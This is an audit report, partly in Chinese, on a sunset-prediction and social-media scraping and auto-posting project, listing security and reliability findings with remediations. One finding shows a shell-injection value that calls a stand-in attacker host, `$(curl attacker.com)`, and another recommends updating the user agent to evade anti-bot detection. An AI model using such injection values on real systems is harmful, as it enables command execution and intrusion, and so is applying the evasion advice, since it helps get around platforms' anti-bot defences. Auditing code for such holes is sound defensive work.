## Summary

sunset-prediction 是一个晚霞预测 + 小红书/微博社交数据爬取 + 自动发帖系统。核心业务逻辑（预测算法、校准数学、等值线构建）健壮，但**生产级安全防护几乎缺失**：无认证、无安全头、无速率限制、shell 注入面、凭证明文存储、非原子文件写入遍布。外部 API 调用层三个 fetcher 均无超时，批量请求无分片保护。校准层存在 UTC/CST 日期偏移高危 bug 和 NaN 静默传播漏洞。

## HIGH Severity Findings

### SP-SRV-H-001 · server.js:85 · route-fix
**Shell command injection via BROWSER_USE_POST_LIMIT env var**
`exec(`python scripts/post_xhs_browseruse.py --headless true --limit ${limit} ...`)` uses `parseInt(process.env.BROWSER_USE_POST_LIMIT || '3')`. If env is tampered to contain shell metacharacters (e.g., `$(curl attacker.com)`), parseInt returns NaN but the full string is still shell-parsed. Even without injection, NaN propagation indicates zero input validation.
**Remediation:** Use `execFile`/`execFileSync` with limit as separate arg; validate `Number.isInteger(limit) && limit > 0 && limit <= 100`.

### SP-SRV-H-002 · src/routes.js:119 · route-fix
**GET /predictions?date= lacks format validation**
`targetDate` from `req.query.date` passed directly to SQLite WHERE clause without regex check. Contrast: POST /social/fetch (L398) has `/^\d{4}-\d{2}-\d{2}$/` validation. Malformed input causes unpredictable query behavior and error message leakage.
**Remediation:** Add same YYYY-MM-DD regex; return 400 on mismatch.

### SP-ENG-H-001 · calibration.js:104 · route-fix
**UTC toISOString() date key shifts by -1 day during CST 00:00–07:59**
`const today = new Date().toISOString().slice(0, 10)` uses UTC. Project already has `localDateCST()` in date-utils.js specifically for this problem (comment explicitly warns about this exact issue), but calibration.js doesn't import it. Weight records land on wrong date → calibration data corruption.
**Remediation:** Replace with `localDateCST()`.

### SP-ENG-H-002 · calibration.js:114 · route-fix
**runDailyCalibration yesterday calculation also UTC-shifted**
`new Date(Date.now() - 86400000).toISOString().slice(0, 10)` — at CST 06:00 (= UTC 22:00 prev day), subtracting 86400000ms then toISOString yields day-before-yesterday instead of yesterday. Historical weather data pulled for wrong date → calibration sample pollution.
**Remediation:** Replace with `localDateCST(-1)`.

### SP-ENG-H-003 · prediction-engine.js:110 · route-fix
**setWeights silently accepts NaN weights**
`typeof NaN === 'number'` passes type check; `Math.abs(NaN - 1.0) > 0.01` evaluates to `false` (NaN comparisons always false), skipping sum validation. NaN weights propagate to all prediction scores.
**Remediation:** Add `Number.isFinite(newWeights[k])` check.

### SP-SCR-H-001 · scripts/post_xhs_browseruse.py:163 · route-fix
**Cookie storage_state written plaintext with default umask**
Session tokens stored in `scripts/.xhs_storage_state.json` with default permissions (world-readable on shared systems). Path under scripts/ risks accidental git commit.
**Remediation:** `os.chmod(STORAGE_STATE, 0o600)` after write; move to `.cache/` or XDG_RUNTIME_DIR; verify .gitignore coverage.

### SP-SCR-H-002 · scripts/xhs_keepalive.py:56 · route-fix
**Non-atomic .env rewrite can truncate credentials on concurrent cron**
`ENV_FILE.write_text(re.sub(..., ENV_FILE.read_text()))` — read-modify-write without flock. Two keepalive instances overlapping → credential file truncation/corruption.
**Remediation:** Write temp file + `os.rename` atomic replace; or `fcntl.flock`.

## MEDIUM Severity Findings

### SP-SRV-M-001 · src/cache.js · structural
**TTLCache never evicts stale entries → unbounded memory growth**
`get()` marks expired entries as `stale:true` but Map never deletes keys. Daily new keys (predictions-{date}, grid-{name}-{date}) accumulate forever.
**Remediation:** Periodic cleanup interval or LRU maxSize cap.

### SP-SRV-M-002 · src/routes.js:56 · route-fix
**Cache loading wait uses fixed setTimeout(2000) instead of promise sharing**
When `isLoading(key)` is true, callers blind-wait 2s then retry once. If upstream fetch >2s (common for weather APIs), caller gets null and triggers duplicate fetch (thundering herd). Affects /predictions, /grid/:name, /contour.
**Remediation:** Share single in-flight Promise via EventEmitter.

### SP-SRV-M-003 · src/routes.js:396 · route-fix
**POST /social/fetch unauthenticated → DoS vector**
Triggers browser-based scraping of all cities' social data. No auth, no rate limit, no body size limit. External attacker can exhaust CPU/memory/cookie quota.
**Remediation:** API key/token auth + strict rate limit (1 req/min) + concurrency lock.

### SP-SRV-M-004 · src/routes.js:461 · route-fix
**POST /xhs/generate unauthenticated → arbitrary server-side script execution**
`execAsync('node scripts/publish-xhs.js')` with only cookie existence check. Stdout/stderr echoed back leaks internal file structure.
**Remediation:** Admin token auth middleware; sanitize response output.

### SP-SRV-M-005 · src/routes.js:130 · route-fix
**502 responses leak err.message to client**
/predictions, /grid/:name, /contour all return `detail: err.message`. Upstream API errors often contain URLs, API key parameter names, internal hostnames.
**Remediation:** Generic detail in production; log full error server-side only.

### SP-SRV-H-003 · server.js:46 · structural
**No CORS, Helmet security headers, or global rate limiting**
All API endpoints open to any origin. No X-Content-Type-Options, CSP, HSTS.
**Remediation:** Add helmet(), cors({origin: whitelist}), express-rate-limit before route mounting.

### SP-ENG-M-001 · calibration-math.js:47 · route-fix
**computeWeightsFromPairs produces NaN when all dimension errors are Infinity**
`rawWeights[k] = 1/(1+Infinity) = 0`; `rawSum = 0`; `normalized[k] = 0/0 = NaN`. Feeds into SP-ENG-H-003.
**Remediation:** Check rawSum === 0 before normalization; fallback to uniform weights.

### SP-ENG-M-002 · weather-fetcher.js:6 · structural
**fetchJSON has no request timeout**
open-meteo API hang → entire fetchAllCityData Promise permanently pending. Same issue in grid-fetcher.js:59 and calibration.js:12.
**Remediation:** AbortController + setTimeout (10–30s).

### SP-ENG-M-003 · weather-fetcher.js:79 · structural
**Batch request for 80 cities approaches open-meteo free-tier ~100 location limit**
URL ~1.3KB. Adding cities past threshold → API silently truncates → array index misalignment → city-data mapping completely shifted.
**Remediation:** Batch in chunks of 50; match results by lat/lon not array index.

### SP-ENG-M-004 · grid-fetcher.js:59 · structural
**fetchJSON only retries 429; transient network errors throw immediately**
DNS failure, connection reset, TLS timeout → no retry. National grid 12 serial batches: any single transient failure breaks entire chain.
**Remediation:** Exponential backoff retry (2–3 attempts) for 5xx and network exceptions.

### SP-ENG-M-005 · prediction-engine.js:6 · route-fix
**gaussian function division by zero when sigma=0**
If x===peak AND sigma===0: `0/0 = NaN` → `exp(NaN) = NaN` → propagates to composite score.
**Remediation:** Guard sigma <= 0 at function entry; return 0 or peak value.

### SP-SCR-M-001 · scripts/mail_push.py:90 · route-fix
**SMTP_PORT int conversion crashes on empty/non-numeric env value**
`int(os.environ.get('SMTP_PORT', '465'))` — empty string → ValueError, uncaught.
**Remediation:** try/except ValueError with fallback to 465 + warning.

### SP-SCR-M-002 · scripts/mail_push.py:164 · structural
**SMTP send has no retry; QQ mailbox transient errors cause permanent failure**
`s.login(); s.send_message()` — no retry/backoff. QQ SMTP frequently returns 450/550 during peak hours.
**Remediation:** 3x exponential backoff (5/15/45s) for SMTPException only.

### SP-SCR-M-003 · src/social-scraper.js:61 · route-fix
**Chromium userAgent hardcoded to Chrome/120.0.0.0 (2023 version)**
~30 major versions behind as of 2026-07. XHS/Weibo anti-bot systems detect outdated UA fingerprints.
**Remediation:** Dynamic UA from playwright chromium defaults or stealth plugin.

### SP-SCR-M-004 · src/social-scraper.js:49 · route-fix
**ESM file uses require('fs') → ReferenceError at runtime**
File uses top-level `import` (ESM) but IN_CONTAINER detection IIFE calls `require('fs').existsSync`. ESM has no global require.
**Remediation:** Use `import { existsSync } from 'fs'` outside IIFE.

### SP-SCR-M-005 · scripts/xhs_keepalive.py:77 · route-fix
**HEALTH_LOG non-atomic read-append-write race condition**
Two keepalive cron overlaps → lost records or corrupted JSON.
**Remediation:** Temp file + os.rename atomic replace; or filelock.

### SP-SCR-M-006 · scripts/publish-xhs.js:37 · route-fix
**fetch API calls have no timeout; localhost service hang → script permanent block**
Node fetch defaults to no timeout. Contrast: social-scraper.js has timedFetch with AbortController+9s.
**Remediation:** AbortController + setTimeout(30s) or unified timedFetch wrapper.

### SP-SCR-M-007 · health-check.py:37 · structural
**fuser -k kills port holder without verification; may kill unrelated service**
If another service happens to bind port 8080, it gets killed. Also: `subprocess.run(['sleep', '1'])` should be `time.sleep(1)`.
**Remediation:** Query PID first → verify cmdline contains node/server.js → then kill.

### SP-SCR-M-008 · checkpoint_wal.py:6 · structural
**WAL checkpoint has no busy_timeout; PRAGMA wal_checkpoint(TRUNCATE) returns BUSY immediately**
TRUNCATE needs exclusive lock; server.js continuously writing → checkpoint silently fails.
**Remediation:** Set `busy_timeout=10000`; check return value for BUSY status and warn.

### SP-SCR-M-009 · scripts/post_xhs_browseruse.py:483 · route-fix
**Post record file non-atomic write; crash leaves half-written JSON**
Direct write to target file; disk full or SIGKILL → corrupted record.
**Remediation:** Temp file + os.rename.
